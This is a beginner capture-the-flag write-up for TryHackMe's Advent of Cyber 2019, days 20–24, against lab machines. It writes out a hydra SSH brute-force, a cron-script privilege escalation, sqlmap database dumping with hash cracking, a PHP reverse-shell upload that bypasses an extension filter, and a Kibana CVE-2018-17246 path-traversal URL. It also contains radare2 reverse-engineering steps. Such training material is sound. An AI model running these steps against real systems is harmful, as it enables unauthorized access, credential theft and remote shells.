# [Advent of Cyber 1 [2019]](https://tryhackme.com/room/25daysofchristmas)

> Get started with Cyber Security in 25 Days - Learn the basics by doing a new, beginner friendly security challenge every day leading up to Christmas.

## Day 20: Cronjob Privilege Escalation

scan the machine

```
nmap -sS -sV -p4000-5000 -T4 10.10.168.154
```

![image](https://user-images.githubusercontent.com/90561566/210505078-34612815-db24-430a-b85a-2afca0aa917a.png)

crack sam's password

```
hydra -l sam -P /usr/share/wordlists/rockyou.txt ssh://10.10.168.154 -s 4567 -V -f
```

![image](https://user-images.githubusercontent.com/90561566/210505372-7d923460-9d97-4c3f-89a1-66d24d85689b.png)

```
ssh sam@10.10.168.154 -p 4567
chocolate
```

![image](https://user-images.githubusercontent.com/90561566/210505815-93ffacf7-211f-447f-b610-50d01fde038d.png)

normally, we can check cron jobs with

```
crontab -l
cat /etc/crontab
```

nothing much, we have stuck when enumerating this machine

but i found a scripts folder by root at /home

![image](https://user-images.githubusercontent.com/90561566/210506371-c08ce18f-6c29-4aa0-85d9-b69909df1434.png)

it has a clean_up.sh owned by ubuntu

![image](https://user-images.githubusercontent.com/90561566/210506614-93215787-2e09-402e-8157-e7a43e5aabc6.png)

we know it maybe the file is running on crontabs

```
echo 'chmod +r /home/ubuntu/flag2.txt' >> clean_up.sh
```

wait about 1 min

![image](https://user-images.githubusercontent.com/90561566/210507393-cc083614-c760-4f80-893f-96b9027fe261.png)

Answer

![image](https://user-images.githubusercontent.com/90561566/210507459-c302be2a-4db0-45ad-85d0-187be4e637a9.png)

## Day 21: Reverse Elf-ineering

there are 2 linux execute files

![image](https://user-images.githubusercontent.com/90561566/210509592-2e9d69c4-b4e1-4605-9365-3d6907264525.png)

install r2

```
git clone https://github.com/radare/radare2
cd radare2
sys/install.sh
```

open up the program in radare2 debugging mode

```
r2 -d challenge1
e asm.syntax=intel
```

analy the program

```
aaaa
afl
```

there are a lot of functions

![image](https://user-images.githubusercontent.com/90561566/210511264-f82f7cb5-699b-49fc-8727-e0b7d857b465.png)

look at main function

```
pdf @main
```

![image](https://user-images.githubusercontent.com/90561566/210511437-9f169400-68fe-49ad-ba87-5ac39b1983e8.png)

The first question asks us to find the value of `local_ch` (which is referred to as `var_ch` in Intel syntax)

So set a breakpoint here and we'll have a look at it when we run the program:

```
db 0x00400b51
```

The next question asks us about the value stored in the `eax` register when the `imul` (signed multiplication) instruction is used. 

```
db 0x00400b62
```

Finally we want to know the value stored in `var_4h` before eax is set to 0 (which happens in the third last line of the function)

```
db 0x00400b69
```

To run the program we use `dc`, which will tell us that we've stopped at a breakpoint

Use `pdf @main` and we can see that the current instruction is highlighted

look at some name of these functions

![image](https://user-images.githubusercontent.com/90561566/210512730-6de52aed-af33-4633-af84-4ad5e2c40f5f.png)

view `var_ch` variable

```
px @rbp-0xc
```

![image](https://user-images.githubusercontent.com/90561566/210513579-ce19fd30-a024-43b7-bf1f-4bfd03aa4e4b.png)

Move one line foward with the `ds` command then look at the value again

![image](https://user-images.githubusercontent.com/90561566/210513633-bfbbba44-3a12-41a4-98ea-add44207fce7.png)

Let's continue the execution `dc` and take a look at the next question

```
dc
pdf @main
```

use `ds` to step one line forward then look at the value of eax after `eax` is multiplied by `var_8h`

remember that as `eax` is a register rather than a memory location, we look at it by querying the register values with the `dr` command

![image](https://user-images.githubusercontent.com/90561566/210514667-b10cdf57-8c2b-4a28-a831-4f27e481c903.png)

continuous

```
dc
pdf @main
```

```
px @rbp-0x4
```

![image](https://user-images.githubusercontent.com/90561566/210515211-9e609e25-d06f-4c7c-9095-9e4882e33fb7.png)

Answer

![image](https://user-images.githubusercontent.com/90561566/210515303-c3359fc5-a40c-4369-8699-d00ea7295dfc.png)

## Day 22: If Santa, Then Christmas

they give us 3 files as follow

![image](https://user-images.githubusercontent.com/90561566/210720238-eeaf8cd3-e72d-4ab3-b8ce-169e4562c04b.png)

start with if2

```
r2 -d if2
aaaa
afl
```

search for main function

![image](https://user-images.githubusercontent.com/90561566/210721406-10adb969-1ab2-41b9-9fd4-a2340fbc04bd.png)

```
pdf @main
```

![image](https://user-images.githubusercontent.com/90561566/210721522-243ffa39-b68c-4d26-9c89-3c16baf44145.png)

to see 2 values before the end of function, set breakpoint at the end of the program before it set to 0

```
db 0x00400b71
```

`dc` to that breakpoint and check 2 variable now

```
px @rbp-0x8
px @rbp-0x4
```

![image](https://user-images.githubusercontent.com/90561566/210727600-6951992b-dd65-4f3a-b93a-9ef65b47ef29.png)

## Day 23: LapLANd (SQL Injection)

there is a login page here

![image](https://user-images.githubusercontent.com/90561566/210947025-2cf3f57c-98e7-49b6-918f-4bec164a53be.png)

try a login request and capture it with Burpsuite

![image](https://user-images.githubusercontent.com/90561566/210947334-0e1ee729-7ebd-4dcb-b7b0-b5412582540a.png)

right click on packet and save item as request.txt

![image](https://user-images.githubusercontent.com/90561566/210947505-f4de0927-1dd9-45f9-81a4-86e95bb32f12.png)

enumerate the database with sqlmap

```
sqlmap -r request.txt --current-db
```

![image](https://user-images.githubusercontent.com/90561566/210948957-dd433c33-99e9-4ae6-b066-ee2535e6fb69.png)

![image](https://user-images.githubusercontent.com/90561566/210950244-f4bef8fc-40c6-497c-a0b9-74a70d212a1f.png)

listing tables

```
sqlmap -r request.txt -D social --tables
```

```
...
Database: social
[8 tables]
+-----------------+
| comments        |
| friend_requests |
| likes           |
| messages        |
| notifications   |
| posts           |
| trends          |
| users           |
+-----------------+
```

get the columns of the table users seem to be interesting

```
sqlmap -r request.txt -D social -T users --columns
```

```
...
Database: social
Table: users
[12 columns]
+--------------+--------------+
| Column       | Type         |
+--------------+--------------+
| id           | int(11)      |
| password     | varchar(255) |
| email        | varchar(100) |
| first_name   | varchar(25)  |
| friend_array | text         |
| last_name    | varchar(25)  |
| num_likes    | int(11)      |
| num_posts    | int(11)      |
| profile_pic  | varchar(255) |
| signup_date  | date         |
| user_closed  | varchar(3)   |
| username     | varchar(100) |
+--------------+--------------+
```

dump Santa’s information

```
sqlmap -r req.txt -D social -T users -C id,password,email,username --dump
# or 
sqlmap -r req.txt -D social -T users -C id,password,email,username --sql-query "select * from users where username like '%santa%'"
```

![image](https://user-images.githubusercontent.com/90561566/210951507-cf62ed6e-0124-4dcd-85ae-f0e43c25acfa.png)

```
...
[18:29:26] [INFO] retrieved: 1
[18:29:27] [INFO] retrieved: f1267830a78c0b59acc06b05694b2e28
[18:29:47] [INFO] retrieved: bigman@shefesh.com
[18:29:55] [INFO] retrieved: santa_claus
select * from users where username like '%santa%' [1]:
[*] 1, f1267830a78c0b59acc06b05694b2e28, bigman@shefesh.com, santa_claus
```

crack the password

```
hashcat -a 0 -m 0 pass.txt /usr/share/wordlists/rockyou.txt
```

![image](https://user-images.githubusercontent.com/90561566/210952395-7037554b-c38a-4b37-b1c0-a9d3fa830d8c.png)

login with santa's acc

![image](https://user-images.githubusercontent.com/90561566/210952621-7a5d2efb-bcea-4791-a541-fd233e91a5ba.png)

let's santa's secret by clicking on Mrs Mistletoego and view their messages

![image](https://user-images.githubusercontent.com/90561566/210952894-b0164928-fd1a-4237-a817-6eed1ed4e884.png)

now, create a reverse shell

```
cp /usr/share/webshells/php/php-reverse-shell.php reverse.php
vi reverse.php
```

![image](https://user-images.githubusercontent.com/90561566/210954423-f83b1e3a-4cbc-4656-8117-af1045023c03.png)

hmm, they block uploading php here

![image](https://user-images.githubusercontent.com/90561566/210954548-24119f30-5961-49ec-91e0-0271908fd77d.png)

but we can change file extension

```
mv reverse.php reverse.phtml
```

successful, open netcat

```
nc -vlnp 4444
```

![image](https://user-images.githubusercontent.com/90561566/210955187-47b21f63-6782-4006-b47d-4651892e9150.png)

![image](https://user-images.githubusercontent.com/90561566/210955852-7bd4e277-ccd7-46e5-b04a-d74b205def85.png)

Answer

![image](https://user-images.githubusercontent.com/90561566/210955964-e599eefe-f1f7-4cbb-a6d4-e6363ea2a3a1.png)

## Day 24: Elf Stalk

scan the target

```
nmap -sS -sV -p- -T4 10.10.208.105
```

![image](https://user-images.githubusercontent.com/90561566/211184917-c250697e-c1e8-4fe5-b217-673aafa34e54.png)

there are a lot of open ports, some interesting are ports 5601 (Kibana), 8000 (Logstack) and 9200 (Elastic Search)

quick research that Elastic Search is a search engine, and we can search with database by appending `/_search?q=<query>` to the url

```
curl http://10.10.208.105:9200/_search?q=password
```

![image](https://user-images.githubusercontent.com/90561566/211185005-b337ad26-a524-40b3-994e-34800f40c5da.png)

view kibana webapp at port 5601

![image](https://user-images.githubusercontent.com/90561566/211185180-6ff36acb-c986-449e-88f3-19301a8ecaae.png)

go to management, i can see kibana version 6.4.2

![image](https://user-images.githubusercontent.com/90561566/211185259-01d8e0f9-160e-4104-bdf7-2dab4a6ba11c.png)

i can find CVE-2018-17246

![image](https://user-images.githubusercontent.com/90561566/211185394-edf9f273-e6a3-458f-b204-3b2b9e0da3ba.png)

there open a LFI vector for us, try this to retrieve the root.txt

```
http://10.10.208.105:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../../root.txt
```

unfortunately, the website is hang on loading, the mean they are handling the js

quick look at port 8000, logstack has a log file of client request, that where we can see our result

![image](https://user-images.githubusercontent.com/90561566/211185507-3fb1c283-e443-443b-8021-672fae6c9a17.png)

the log file looks pretty messed up, let's use Ctrl+F

![image](https://user-images.githubusercontent.com/90561566/211185977-207d5276-34f4-43ad-8521-a0fee5a34506.png)

Answer

![image](https://user-images.githubusercontent.com/90561566/211185981-7bb4c5a2-074f-4826-98ac-5563a403d66a.png)
